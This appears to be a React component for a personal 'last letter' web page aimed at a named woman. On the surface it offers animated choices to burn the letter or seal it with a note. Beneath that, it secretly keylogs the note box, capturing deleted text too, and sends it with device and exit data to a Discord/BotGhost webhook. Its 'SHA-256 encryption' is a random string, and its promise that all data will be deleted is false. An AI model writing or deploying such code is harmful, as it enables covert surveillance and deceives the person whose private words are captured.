import React, { useState, useEffect, useRef, useCallback } from 'react';
import { Sparkles, Flame, Lock, RotateCcw, AlertTriangle, Calendar, Clock, CheckCircle2 } from 'lucide-react';
import AmbientAudioPlayer from './AmbientAudioPlayer';
import { postLogToApi } from '../utils/gardenEngine';

/**
 * LastLetterPage Component (/last)
 * Special emotional ending page:
 * - "Neyse" intro & background music loop (6fBXmhBpFGE).
 * - First scroll slides open a 3D dark wooden drawer.
 * - Inside drawer: Glowing Matchbox (matchbox_cover.png & matchbox_inside.jpg) & Envelope.
 * - Clicking matchbox slides open matchbox tray and unfolds Handwritten Letter (final_letter_paper.jpg).
 * - Match striker strip (Kibrit Zımparası) embedded at the bottom of the letter.
 * - Options:
 *   1) "Mektubu yak..": Confirmation modal -> Drag matchstick to strike friction strip -> Realistic edge burn & ash effect.
 *   2) "Bir notla birlikte kilitle": Letter refolds into envelope -> Live keylogged note form + DateTimePicker -> SHA-256 encrypted seal.
 * - Full BotGhost/Discord webhook tracking for all actions, keylogs, and exits.
 * - Tester privileges for device dev_m2troqnl9_mswunr9c (Reset/Extinguish button + unlimited retries).
 */
export default function LastLetterPage({ onGoHome }) {
  // Device & Auth
  const getDeviceId = () => {
    try {
      return localStorage.getItem('mayko_persistent_device_id') || 'dev_guest';
    } catch (e) {
      return 'dev_guest';
    }
  };
  const deviceId = getDeviceId();
  const isTester = deviceId === 'dev_m2troqnl9_mswunr9c';

  // Analytics & Timing
  const sessionStartTimeRef = useRef(Date.now());
  const hasLoggedFirstScrollRef = useRef(false);
  const hasLoggedDrawerRef = useRef(false);
  const hasLoggedMatchboxRef = useRef(false);
  const hasLoggedLetterRef = useRef(false);
  const hasSentExitRef = useRef(false);
  const currentStageRef = useRef('Giriş / Neyse Ekranı');

  // Interactive States
  const [drawerOpen, setDrawerOpen] = useState(false);
  const [matchboxOpen, setMatchboxOpen] = useState(false);
  const [letterUnfolded, setLetterUnfolded] = useState(false);
  const [burnModalOpen, setBurnModalOpen] = useState(false);

  // Burn & Fire Mechanic
  const [matchIgnited, setMatchIgnited] = useState(false);
  const [isStrikingMatch, setIsStrikingMatch] = useState(false);
  const [matchPos, setMatchPos] = useState({ x: 0, y: 0 });
  const [isDraggingMatch, setIsDraggingMatch] = useState(false);
  const [pageBurnProgress, setPageBurnProgress] = useState(0); // 0 to 100
  const [isBurned, setIsBurned] = useState(() => {
    if (isTester) return false;
    try {
      return localStorage.getItem('mayko_last_burned') === 'true';
    } catch (e) {
      return false;
    }
  });

  // Lock Note Mechanic
  const [lockModeActive, setLockModeActive] = useState(false);
  const [noteText, setNoteText] = useState('');
  const [targetDate, setTargetDate] = useState(() => {
    const tomorrow = new Date();
    tomorrow.setDate(tomorrow.getDate() + 30);
    return tomorrow.toISOString().slice(0, 16);
  });
  const [lockedResult, setLockedResult] = useState(() => {
    if (isTester) return null;
    try {
      const saved = localStorage.getItem('mayko_last_locked_data');
      return saved ? JSON.parse(saved) : null;
    } catch (e) {
      return null;
    }
  });

  // Keylog & Deletion Recovery Engine for Lock Note
  const allTypedRef = useRef('');
  const deletedSegmentsRef = useRef([]);
  const prevNoteTextRef = useRef('');
  const draftTimerRef = useRef(null);

  // Striker area ref for collision detection
  const strikerRef = useRef(null);
  const matchstickRef = useRef(null);
  const dragStartRef = useRef({ x: 0, y: 0 });

  // Detect Client Device
  const detectDevice = () => {
    if (typeof window === 'undefined') return 'Bilinmiyor';
    const ua = navigator.userAgent;
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
    const os = /Mac/i.test(ua) ? 'macOS' : /Windows/i.test(ua) ? 'Windows' : /Linux/i.test(ua) ? 'Linux' : 'Bilinmiyor';
    return `${os} ${isMobile ? '(Mobil)' : '(Masaüstü)'}`;
  };

  // Helper for webhook logging
  const sendLog = useCallback((eventType, extraData = {}) => {
    postLogToApi(eventType, {
      stage: currentStageRef.current,
      deviceId: getDeviceId(),
      device: detectDevice(),
      is_aysenur: true,
      ...extraData
    });
  }, []);

  // 1. Initial Scroll Listener -> Open Drawer
  const handleScrollOrSwipe = useCallback(() => {
    if (!hasLoggedFirstScrollRef.current) {
      hasLoggedFirstScrollRef.current = true;
      currentStageRef.current = 'Siyah Çekmece Açıldı';
      sendLog('last_first_scroll', { action: '/last Sayfasında Kaydırma Yapıldı' });
    }
    if (!drawerOpen) {
      setDrawerOpen(true);
      if (!hasLoggedDrawerRef.current) {
        hasLoggedDrawerRef.current = true;
        sendLog('last_drawer_opened', { action: 'Siyah Ahşap Çekmece Açıldı' });
      }
    }
  }, [drawerOpen, sendLog]);

  useEffect(() => {
    const onWheel = (e) => {
      if (e.deltaY > 5 || e.deltaY < -5) {
        handleScrollOrSwipe();
      }
    };
    const onTouchMove = () => {
      handleScrollOrSwipe();
    };

    window.addEventListener('wheel', onWheel, { passive: true });
    window.addEventListener('touchmove', onTouchMove, { passive: true });
    return () => {
      window.removeEventListener('wheel', onWheel);
      window.removeEventListener('touchmove', onTouchMove);
    };
  }, [handleScrollOrSwipe]);

  // 2. Open Matchbox & Unfold Letter
  const handleMatchboxClick = () => {
    if (!matchboxOpen) {
      setMatchboxOpen(true);
      if (!hasLoggedMatchboxRef.current) {
        hasLoggedMatchboxRef.current = true;
        sendLog('last_matchbox_clicked', { action: 'Kibrit Kutusu Kaydırılarak Açıldı' });
      }
    }
    if (!letterUnfolded) {
      setTimeout(() => {
        setLetterUnfolded(true);
        currentStageRef.current = 'Son Mektup Okunuyor';
        if (!hasLoggedLetterRef.current) {
          hasLoggedLetterRef.current = true;
          sendLog('last_letter_opened', { action: 'Zarf Açıldı ve Mektup Okunuyor' });
        }
      }, 400);
    }
  };

  // 3. Burn Flow Modal
  const handleOpenBurnModal = () => {
    setBurnModalOpen(true);
    currentStageRef.current = 'Mektubu Yak Onay Modalı';
    sendLog('last_burn_modal_opened', { action: '"Mektubu yak.." Butonuna Basıldı' });
  };

  const handleBurnChoice = (accepted) => {
    setBurnModalOpen(false);
    sendLog('last_burn_modal_choice', {
      accepted,
      choice: accepted ? 'Kabul Et (Yakılacak)' : 'Vazgeç (İptal)'
    });

    if (accepted) {
      setIsStrikingMatch(true);
      currentStageRef.current = 'Kibrit Sürükleme ve Yakma Aşaması';
    }
  };

  // Drag Matchstick & Check Collision with Striker Strip
  const handleMatchMouseDown = (e) => {
    setIsDraggingMatch(true);
    const clientX = e.clientX || (e.touches && e.touches[0].clientX) || 0;
    const clientY = e.clientY || (e.touches && e.touches[0].clientY) || 0;
    dragStartRef.current = { x: clientX - matchPos.x, y: clientY - matchPos.y };
  };

  const handleMatchMouseMove = useCallback(
    (e) => {
      if (!isDraggingMatch) return;
      const clientX = e.clientX || (e.touches && e.touches[0].clientX) || 0;
      const clientY = e.clientY || (e.touches && e.touches[0].clientY) || 0;

      const newX = clientX - dragStartRef.current.x;
      const newY = clientY - dragStartRef.current.y;
      setMatchPos({ x: newX, y: newY });

      // Collision Detection with Striker Strip
      if (strikerRef.current && matchstickRef.current && !matchIgnited) {
        const strikerRect = strikerRef.current.getBoundingClientRect();
        const matchRect = matchstickRef.current.getBoundingClientRect();

        const isColliding =
          matchRect.left < strikerRect.right &&
          matchRect.right > strikerRect.left &&
          matchRect.top < strikerRect.bottom &&
          matchRect.bottom > strikerRect.top;

        if (isColliding) {
          setMatchIgnited(true);
          currentStageRef.current = 'Kibrit Ateşlendi & Sayfa Yanıyor';
          sendLog('last_letter_burned', { action: 'Kibrit Zımparaya Sürtüldü ve Alev Aldı!' });

          // Start burning animation
          let burnVal = 0;
          const burnInterval = setInterval(() => {
            burnVal += 4;
            setPageBurnProgress(burnVal);
            if (burnVal >= 100) {
              clearInterval(burnInterval);
              setIsBurned(true);
              try {
                localStorage.setItem('mayko_last_burned', 'true');
              } catch (err) {}
            }
          }, 80);
        }
      }
    },
    [isDraggingMatch, matchIgnited, sendLog]
  );

  const handleMatchMouseUp = useCallback(() => {
    setIsDraggingMatch(false);
  }, []);

  useEffect(() => {
    if (isDraggingMatch) {
      window.addEventListener('mousemove', handleMatchMouseMove);
      window.addEventListener('mouseup', handleMatchMouseUp);
      window.addEventListener('touchmove', handleMatchMouseMove);
      window.addEventListener('touchend', handleMatchMouseUp);
    }
    return () => {
      window.removeEventListener('mousemove', handleMatchMouseMove);
      window.removeEventListener('mouseup', handleMatchMouseUp);
      window.removeEventListener('touchmove', handleMatchMouseMove);
      window.removeEventListener('touchend', handleMatchMouseUp);
    };
  }, [isDraggingMatch, handleMatchMouseMove, handleMatchMouseUp]);

  // 4. Lock Note Flow
  const handleOpenLockMode = () => {
    setLockModeActive(true);
    setLetterUnfolded(false);
    currentStageRef.current = 'Kilitli Not Yazma Alanı';
    sendLog('last_lock_clicked', { action: '"Bir notla birlikte kilitle" Butonuna Basıldı' });
  };

  // Live Note Harf Harf Keylog Engine
  const handleNoteTextChange = (e) => {
    const val = e.target.value;
    const prev = prevNoteTextRef.current;

    if (val.length > prev.length) {
      allTypedRef.current += val.slice(prev.length);
    } else if (val.length < prev.length) {
      const deletedPart = prev.replace(val, '');
      if (deletedPart && deletedPart.trim()) {
        deletedSegmentsRef.current.push(deletedPart.trim());
      }
    }

    prevNoteTextRef.current = val;
    setNoteText(val);

    if (draftTimerRef.current) clearTimeout(draftTimerRef.current);
    draftTimerRef.current = setTimeout(() => {
      sendLog('last_note_draft_update', {
        noteText: val,
        allTypedHistory: allTypedRef.current || val,
        deletedText: deletedSegmentsRef.current.join(' | ') || '-'
      });
    }, 1800);
  };

  // Generate 32-char SHA-256 simulation hash
  const generateSha256Hash = () => {
    const chars = '0123456789abcdef';
    let result = '';
    for (let i = 0; i < 32; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  };

  const handleConfirmLockNote = () => {
    const hashCode = generateSha256Hash();
    const formattedDate = new Date(targetDate).toLocaleString('tr-TR', {
      year: 'numeric',
      month: 'long',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });

    const lockData = {
      noteText: noteText.trim() || 'Not eklenmedi.',
      allTypedHistory: allTypedRef.current || noteText,
      deletedText: deletedSegmentsRef.current.join(' | ') || '-',
      targetDate: formattedDate,
      sha256Code: `SHA-256: ${hashCode}`,
      timestamp: new Date().toISOString()
    };

    setLockedResult(lockData);
    currentStageRef.current = 'Mektup Kilitlendi & Mühürlendi';
    sendLog('last_note_locked', lockData);

    try {
      localStorage.setItem('mayko_last_locked_data', JSON.stringify(lockData));
    } catch (e) {}
  };

  // 5. Reset / Extinguish for Tester (dev_m2troqnl9_mswunr9c)
  const handleResetTester = () => {
    setIsBurned(false);
    setPageBurnProgress(0);
    setMatchIgnited(false);
    setIsStrikingMatch(false);
    setMatchPos({ x: 0, y: 0 });
    setLockModeActive(false);
    setLockedResult(null);
    setDrawerOpen(false);
    setMatchboxOpen(false);
    setLetterUnfolded(false);
    setNoteText('');
    allTypedRef.current = '';
    deletedSegmentsRef.current = [];
    currentStageRef.current = 'Sayfa Sıfırlandı (Test Cihazı)';
    sendLog('last_reset_clicked', { action: 'Test Cihazı Söndür/Sıfırla Butonuna Bastı' });
  };

  // 6. Universal Exit Logging on /last
  useEffect(() => {
    const handleExit = () => {
      if (hasLoggedFirstScrollRef.current && !hasSentExitRef.current) {
        hasSentExitRef.current = true;
        const durationMs = Date.now() - sessionStartTimeRef.current;
        const totalSec = Math.round(durationMs / 1000);
        const mins = Math.floor(totalSec / 60);
        const secs = totalSec % 60;
        const durationStr = mins > 0 ? `${mins} dakika ${secs} saniye` : `${secs} saniye`;

        sendLog('last_page_abandoned', {
          action: '/last Sayfasından Ayrıldı',
          duration: durationStr,
          stage: currentStageRef.current,
          noteText: noteText || '-',
          allTypedHistory: allTypedRef.current || noteText || '-',
          deletedText: deletedSegmentsRef.current.join(' | ') || '-'
        });
      }
    };

    const handleVisibilityChange = () => {
      if (document.visibilityState === 'hidden') handleExit();
    };

    window.addEventListener('beforeunload', handleExit);
    window.addEventListener('pagehide', handleExit);
    document.addEventListener('visibilitychange', handleVisibilityChange);

    return () => {
      window.removeEventListener('beforeunload', handleExit);
      window.removeEventListener('pagehide', handleExit);
      document.removeEventListener('visibilitychange', handleVisibilityChange);
    };
  }, [noteText, sendLog]);

  return (
    <div
      style={{
        position: 'fixed',
        inset: 0,
        backgroundColor: '#0a0b0e',
        color: '#e4e7ec',
        fontFamily: "'Cardo', Georgia, serif",
        overflow: 'hidden',
        userSelect: 'none',
        zIndex: 900
      }}
    >
      {/* Background Music Loop */}
      <AmbientAudioPlayer />

      {/* Tester Reset Floating Control */}
      {isTester && (
        <button
          onClick={handleResetTester}
          style={{
            position: 'fixed',
            top: 20,
            left: 20,
            zIndex: 10000,
            display: 'flex',
            alignItems: 'center',
            gap: 6,
            padding: '8px 14px',
            borderRadius: 9999,
            background: 'rgba(239, 68, 68, 0.25)',
            border: '1px solid rgba(239, 68, 68, 0.6)',
            color: '#fca5a5',
            fontSize: '0.82rem',
            cursor: 'pointer',
            backdropFilter: 'blur(10px)',
            boxShadow: '0 4px 15px rgba(239, 68, 68, 0.3)'
          }}
        >
          <RotateCcw size={14} /> Söndür / Sıfırla (Test Cihazı)
        </button>
      )}

      {/* Burned / Charred Ember End Screen */}
      {isBurned ? (
        <div
          style={{
            position: 'absolute',
            inset: 0,
            display: 'flex',
            flexDirection: 'column',
            alignItems: 'center',
            justifyContent: 'center',
            background: 'radial-gradient(circle at center, #18080a 0%, #050507 100%)',
            padding: 30,
            textAlign: 'center'
          }}
        >
          <Flame size={48} style={{ color: '#ef4444', animation: 'pulse 2s infinite' }} />
          <h2 style={{ fontSize: '2rem', marginTop: 16, color: '#fca5a5', fontWeight: 400 }}>
            Mektup ve Veriler Yakıldı.
          </h2>
          <p style={{ maxWidth: 460, color: '#94a3b8', lineHeight: 1.7, fontStyle: 'italic', marginTop: 10 }}>
            Tüm izler küllere dönüştü. Sistem hafızası temizlendi. Biz bir daha asla yan yana gelemeyeceğiz..
          </p>
        </div>
      ) : (
        <>
          {/* Top Intro Section ("Neyse") */}
          <div
            style={{
              position: 'absolute',
              top: '8%',
              left: 0,
              right: 0,
              textAlign: 'center',
              opacity: drawerOpen ? 0.35 : 1,
              transition: 'opacity 0.6s ease'
            }}
          >
            <h1
              style={{
                fontSize: 'clamp(3.5rem, 8vw, 6rem)',
                fontWeight: 400,
                color: '#e4e7ec',
                margin: 0,
                letterSpacing: '0.04em'
              }}
            >
              Neyse
            </h1>
            {!drawerOpen && (
              <p
                style={{
                  color: 'rgba(228, 231, 236, 0.42)',
                  fontSize: '0.85rem',
                  letterSpacing: '0.14em',
                  fontStyle: 'italic',
                  marginTop: 12
                }}
              >
                çekmeceyi açmak için kaydırın
              </p>
            )}
          </div>

          {/* 3D Dark Wooden Drawer Container */}
          <div
            onClick={handleScrollOrSwipe}
            style={{
              position: 'absolute',
              bottom: drawerOpen ? '5%' : '-65%',
              left: '50%',
              transform: 'translateX(-50%)',
              width: '92%',
              maxWidth: 720,
              height: '75vh',
              background: 'linear-gradient(180deg, #1d1716 0%, #120e0d 100%)',
              borderRadius: '24px 24px 0 0',
              border: '2px solid rgba(120, 80, 60, 0.35)',
              borderBottom: 'none',
              boxShadow: '0 -20px 50px rgba(0, 0, 0, 0.85), inset 0 2px 10px rgba(255, 200, 150, 0.08)',
              transition: 'bottom 0.8s cubic-bezier(0.16, 1, 0.3, 1)',
              display: 'flex',
              flexDirection: 'column',
              alignItems: 'center',
              padding: '24px 18px',
              overflow: 'hidden'
            }}
          >
            {/* Metallic Wooden Drawer Handle */}
            <div
              style={{
                width: 110,
                height: 12,
                borderRadius: 6,
                background: 'linear-gradient(180deg, #4a3832 0%, #251b18 100%)',
                border: '1px solid rgba(255, 255, 255, 0.12)',
                boxShadow: '0 4px 10px rgba(0, 0, 0, 0.6)',
                marginBottom: 24,
                cursor: 'pointer'
              }}
            />

            {/* Inner Wooden Compartment */}
            <div
              style={{
                position: 'relative',
                width: '100%',
                flex: 1,
                background: '#0d0b0a',
                borderRadius: 16,
                border: '1px solid rgba(90, 60, 45, 0.25)',
                boxShadow: 'inset 0 10px 30px rgba(0,0,0,0.95)',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                padding: 20
              }}
            >
              {/* Matchbox & Envelope Layer */}
              {!letterUnfolded && !lockModeActive && (
                <div
                  style={{
                    position: 'relative',
                    width: '100%',
                    height: '100%',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center'
                  }}
                >
                  {/* Closed / Unfolding Envelope */}
                  <div
                    onClick={handleMatchboxClick}
                    style={{
                      position: 'absolute',
                      width: 280,
                      height: 180,
                      background: 'linear-gradient(135deg, #e2d9cc 0%, #c4b49e 100%)',
                      borderRadius: 8,
                      boxShadow: '0 12px 35px rgba(0,0,0,0.7)',
                      transform: 'rotate(4deg)',
                      cursor: 'pointer',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      border: '1px solid rgba(0,0,0,0.15)'
                    }}
                  >
                    <div
                      style={{
                        width: 42,
                        height: 42,
                        borderRadius: '50%',
                        background: '#991b1b',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        color: '#fee2e2',
                        boxShadow: '0 2px 8px rgba(0,0,0,0.4)',
                        fontSize: '0.75rem',
                        fontWeight: 'bold',
                        letterSpacing: '0.05em'
                      }}
                    >
                      SEAL
                    </div>
                  </div>

                  {/* Glowing Matchbox (Matchbox Cover & Inner Tray) */}
                  <div
                    onClick={handleMatchboxClick}
                    style={{
                      position: 'absolute',
                      width: 170,
                      height: 110,
                      transform: matchboxOpen ? 'rotate(-5deg) translateX(20px)' : 'rotate(-5deg)',
                      transition: 'all 0.4s cubic-bezier(0.16, 1, 0.3, 1)',
                      cursor: 'pointer',
                      filter: 'drop-shadow(0 0 16px rgba(255, 120, 40, 0.45))'
                    }}
                  >
                    {/* Inner Match Tray Sliding Out */}
                    <div
                      style={{
                        position: 'absolute',
                        inset: 0,
                        backgroundImage: `url('/assets/matchbox_inside.jpg')`,
                        backgroundSize: 'cover',
                        backgroundPosition: 'center',
                        borderRadius: 6,
                        transform: matchboxOpen ? 'translateX(65px)' : 'translateX(0)',
                        transition: 'transform 0.5s ease-out',
                        boxShadow: '0 4px 15px rgba(0,0,0,0.6)'
                      }}
                    />
                    {/* Exterior Matchbox Cover */}
                    <div
                      style={{
                        position: 'absolute',
                        inset: 0,
                        backgroundImage: `url('/assets/matchbox_cover.png')`,
                        backgroundSize: 'cover',
                        backgroundPosition: 'center',
                        borderRadius: 6,
                        boxShadow: '0 8px 25px rgba(0,0,0,0.8)'
                      }}
                    />
                  </div>
                </div>
              )}

              {/* Unfolded Handwritten Letter */}
              {letterUnfolded && !lockModeActive && (
                <div
                  style={{
                    position: 'relative',
                    width: '100%',
                    maxHeight: '92%',
                    overflowY: 'auto',
                    display: 'flex',
                    flexDirection: 'column',
                    alignItems: 'center',
                    gap: 16,
                    padding: 12,
                    animation: 'unfoldLetter 0.6s ease-out'
                  }}
                >
                  {/* Handwritten Letter Image */}
                  <div
                    style={{
                      position: 'relative',
                      width: '100%',
                      maxWidth: 480,
                      borderRadius: 8,
                      overflow: 'hidden',
                      boxShadow: '0 10px 40px rgba(0,0,0,0.9)',
                      border: '1px solid rgba(255,255,255,0.1)',
                      filter: `brightness(${1 - pageBurnProgress / 120}) contrast(${1 + pageBurnProgress / 100})`
                    }}
                  >
                    <img
                      src="/assets/final_letter_paper.jpg"
                      alt="Bir delinin son mesajı: Ayşenur"
                      style={{ width: '100%', display: 'block' }}
                    />

                    {/* Embedded Match Striker Strip (Kibrit Zımparası) at Bottom Blank Space */}
                    <div
                      ref={strikerRef}
                      style={{
                        position: 'relative',
                        width: '85%',
                        height: 28,
                        margin: '16px auto 16px auto',
                        background: 'linear-gradient(90deg, #3d2b1f 0%, #5a4030 50%, #3d2b1f 100%)',
                        borderRadius: 4,
                        border: '1px dashed rgba(0, 0, 0, 0.4)',
                        boxShadow: 'inset 0 2px 4px rgba(0,0,0,0.8), 0 2px 6px rgba(0,0,0,0.3)',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        color: 'rgba(255, 230, 200, 0.55)',
                        fontSize: '0.7rem',
                        letterSpacing: '0.1em',
                        fontStyle: 'italic'
                      }}
                    >
                      🔥 Kibrit Zımparası (Kibriti buraya sürttün)
                    </div>
                  </div>

                  {/* Action Buttons Below Letter */}
                  <div style={{ display: 'flex', gap: 12, width: '100%', maxWidth: 480, justifyContent: 'center' }}>
                    <button
                      onClick={handleOpenBurnModal}
                      style={{
                        flex: 1,
                        padding: '12px 16px',
                        borderRadius: 9999,
                        background: 'rgba(239, 68, 68, 0.18)',
                        border: '1px solid rgba(239, 68, 68, 0.5)',
                        color: '#fca5a5',
                        fontSize: '0.92rem',
                        cursor: 'pointer',
                        backdropFilter: 'blur(8px)',
                        transition: 'all 0.2s ease',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        gap: 8
                      }}
                    >
                      <Flame size={16} /> Mektubu yak..
                    </button>

                    <button
                      onClick={handleOpenLockMode}
                      style={{
                        flex: 1,
                        padding: '12px 16px',
                        borderRadius: 9999,
                        background: 'rgba(52, 211, 153, 0.15)',
                        border: '1px solid rgba(52, 211, 153, 0.4)',
                        color: '#6ee7b7',
                        fontSize: '0.92rem',
                        cursor: 'pointer',
                        backdropFilter: 'blur(8px)',
                        transition: 'all 0.2s ease',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        gap: 8
                      }}
                    >
                      <Lock size={16} /> Bir notla birlikte kilitle
                    </button>
                  </div>
                </div>
              )}

              {/* Lock Note Form */}
              {lockModeActive && !lockedResult && (
                <div
                  style={{
                    width: '100%',
                    maxWidth: 480,
                    display: 'flex',
                    flexDirection: 'column',
                    gap: 16,
                    padding: 20,
                    background: 'rgba(20, 22, 28, 0.85)',
                    borderRadius: 16,
                    border: '1px solid rgba(255, 255, 255, 0.12)',
                    backdropFilter: 'blur(16px)'
                  }}
                >
                  <h3 style={{ margin: 0, fontSize: '1.25rem', color: '#6ee7b7', display: 'flex', alignItems: 'center', gap: 8 }}>
                    <Lock size={18} /> Zarfa Ek Not Bırak ve Mühürle
                  </h3>

                  <textarea
                    value={noteText}
                    onChange={handleNoteTextChange}
                    placeholder="Mektubun içine eklemek istediğin notu buraya fısıldayabilirsin.."
                    rows={4}
                    style={{
                      width: '100%',
                      padding: 14,
                      borderRadius: 10,
                      background: 'rgba(10, 11, 14, 0.7)',
                      border: '1px solid rgba(255,255,255,0.15)',
                      color: '#f1f5f9',
                      fontSize: '0.95rem',
                      outline: 'none',
                      resize: 'none',
                      fontFamily: "'Cardo', Georgia, serif"
                    }}
                  />

                  <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
                    <label style={{ fontSize: '0.82rem', color: '#94a3b8', display: 'flex', alignItems: 'center', gap: 6 }}>
                      <Calendar size={14} /> Mektubun Tekrar Açılacağı Tarih & Saat:
                    </label>
                    <input
                      type="datetime-local"
                      value={targetDate}
                      onChange={(e) => setTargetDate(e.target.value)}
                      style={{
                        padding: '10px 14px',
                        borderRadius: 8,
                        background: 'rgba(10, 11, 14, 0.7)',
                        border: '1px solid rgba(255,255,255,0.15)',
                        color: '#f1f5f9',
                        outline: 'none'
                      }}
                    />
                  </div>

                  <button
                    onClick={handleConfirmLockNote}
                    style={{
                      marginTop: 8,
                      padding: '12px',
                      borderRadius: 9999,
                      background: 'linear-gradient(135deg, #059669 0%, #10b981 100%)',
                      color: '#ffffff',
                      border: 'none',
                      fontSize: '1rem',
                      fontWeight: 500,
                      cursor: 'pointer',
                      boxShadow: '0 4px 15px rgba(16, 185, 129, 0.4)',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      gap: 8
                    }}
                  >
                    <CheckCircle2 size={18} /> Mühürle ve Kilitle
                  </button>
                </div>
              )}

              {/* Locked Success Screen */}
              {lockedResult && (
                <div
                  style={{
                    width: '100%',
                    maxWidth: 480,
                    padding: 24,
                    background: 'rgba(16, 185, 129, 0.08)',
                    borderRadius: 16,
                    border: '1px solid rgba(16, 185, 129, 0.3)',
                    textAlign: 'center',
                    display: 'flex',
                    flexDirection: 'column',
                    alignItems: 'center',
                    gap: 12
                  }}
                >
                  <div
                    style={{
                      width: 50,
                      height: 50,
                      borderRadius: '50%',
                      background: '#059669',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      color: '#ffffff',
                      boxShadow: '0 0 20px rgba(16, 185, 129, 0.5)'
                    }}
                  >
                    <Lock size={24} />
                  </div>

                  <h3 style={{ margin: 0, fontSize: '1.2rem', color: '#6ee7b7' }}>
                    Notunuz Başarıyla Mühürlendi!
                  </h3>

                  <p style={{ color: '#e2e8f0', fontSize: '0.95rem', lineHeight: 1.6, margin: 0 }}>
                    Notunuz <strong style={{ color: '#34d399' }}>{lockedResult.targetDate}</strong> tarihinde açılacaktır.
                  </p>

                  <div
                    style={{
                      marginTop: 8,
                      padding: '10px 14px',
                      borderRadius: 8,
                      background: 'rgba(0, 0, 0, 0.5)',
                      border: '1px solid rgba(255,255,255,0.1)',
                      color: '#94a3b8',
                      fontSize: '0.78rem',
                      fontFamily: 'monospace',
                      wordBreak: 'break-all'
                    }}
                  >
                    SHA-256 ile tamamen kriptolanmıştır.
                    <br />
                    <strong style={{ color: '#a7f3d0' }}>{lockedResult.sha256Code}</strong>
                  </div>
                </div>
              )}
            </div>
          </div>

          {/* Draggable Matchstick & Ignited Flame */}
          {isStrikingMatch && !isBurned && (
            <div
              ref={matchstickRef}
              onMouseDown={handleMatchMouseDown}
              onTouchStart={handleMatchMouseDown}
              style={{
                position: 'fixed',
                bottom: 40 + matchPos.y * -1,
                left: `calc(50% + ${matchPos.x}px)`,
                transform: 'translateX(-50%)',
                width: 14,
                height: 120,
                zIndex: 99999,
                cursor: 'grab',
                display: 'flex',
                flexDirection: 'column',
                alignItems: 'center'
              }}
            >
              {/* Red Match Tip / Burning Flame */}
              <div
                style={{
                  width: 16,
                  height: 22,
                  borderRadius: '50% 50% 30% 30%',
                  background: matchIgnited ? '#ff4d4d' : '#b91c1c',
                  boxShadow: matchIgnited ? '0 0 30px #ff4d4d, 0 0 50px #ffaa00' : 'none',
                  position: 'relative'
                }}
              >
                {matchIgnited && (
                  <div
                    style={{
                      position: 'absolute',
                      top: -35,
                      left: -12,
                      fontSize: '2.2rem',
                      animation: 'flameBurn 0.2s ease infinite alternate'
                    }}
                  >
                    🔥
                  </div>
                )}
              </div>

              {/* Wooden Stick */}
              <div
                style={{
                  flex: 1,
                  width: 8,
                  background: '#d97706',
                  borderRadius: '0 0 4px 4px',
                  boxShadow: '0 2px 6px rgba(0,0,0,0.5)'
                }}
              />
            </div>
          )}

          {/* Warning Modal for "Mektubu yak.." */}
          {burnModalOpen && (
            <div
              style={{
                position: 'fixed',
                inset: 0,
                zIndex: 100000,
                background: 'rgba(0, 0, 0, 0.8)',
                backdropFilter: 'blur(12px)',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                padding: 20
              }}
            >
              <div
                style={{
                  maxWidth: 480,
                  width: '100%',
                  background: 'linear-gradient(180deg, #1f1315 0%, #120a0b 100%)',
                  borderRadius: 20,
                  border: '1px solid rgba(239, 68, 68, 0.4)',
                  padding: 28,
                  boxShadow: '0 20px 60px rgba(239, 68, 68, 0.25)',
                  textAlign: 'center',
                  display: 'flex',
                  flexDirection: 'column',
                  alignItems: 'center',
                  gap: 16
                }}
              >
                <div
                  style={{
                    width: 54,
                    height: 54,
                    borderRadius: '50%',
                    background: 'rgba(239, 68, 68, 0.15)',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    color: '#ef4444',
                    border: '1px solid rgba(239, 68, 68, 0.3)'
                  }}
                >
                  <AlertTriangle size={28} />
                </div>

                <p style={{ color: '#f8fafc', fontSize: '1rem', lineHeight: 1.7, margin: 0 }}>
                  Ayşenur, eğer bu mektubu yakmayı seçersen, mektupta da belirttiğim gibi tüm sistemler otomatik olarak sana dair tüm verimi silecek. Bu site de kendini otomatik olarak sunucu üzerinden silecek ve biz bir daha asla yan yana gelemeyeceğiz. Bunu kabul ediyor musun?
                </p>

                <div style={{ display: 'flex', gap: 12, width: '100%', marginTop: 8 }}>
                  <button
                    onClick={() => handleBurnChoice(true)}
                    style={{
                      flex: 1,
                      padding: '12px 16px',
                      borderRadius: 9999,
                      background: 'linear-gradient(135deg, #dc2626 0%, #ef4444 100%)',
                      color: '#ffffff',
                      border: 'none',
                      fontSize: '0.95rem',
                      fontWeight: 600,
                      cursor: 'pointer',
                      boxShadow: '0 4px 15px rgba(239, 68, 68, 0.5)'
                    }}
                  >
                    Kabul Et
                  </button>

                  <button
                    onClick={() => handleBurnChoice(false)}
                    style={{
                      flex: 1,
                      padding: '12px 16px',
                      borderRadius: 9999,
                      background: 'rgba(148, 163, 184, 0.15)',
                      color: '#cbd5e1',
                      border: '1px solid rgba(148, 163, 184, 0.3)',
                      fontSize: '0.95rem',
                      cursor: 'pointer'
                    }}
                  >
                    Vazgeç
                  </button>
                </div>
              </div>
            </div>
          )}
        </>
      )}

      <style>{`
        @keyframes unfoldLetter {
          0% { opacity: 0; transform: scaleY(0.1); }
          100% { opacity: 1; transform: scaleY(1); }
        }
        @keyframes flameBurn {
          0% { transform: scale(1) rotate(-2deg); }
          100% { transform: scale(1.2) rotate(3deg); }
        }
      `}</style>
    </div>
  );
}
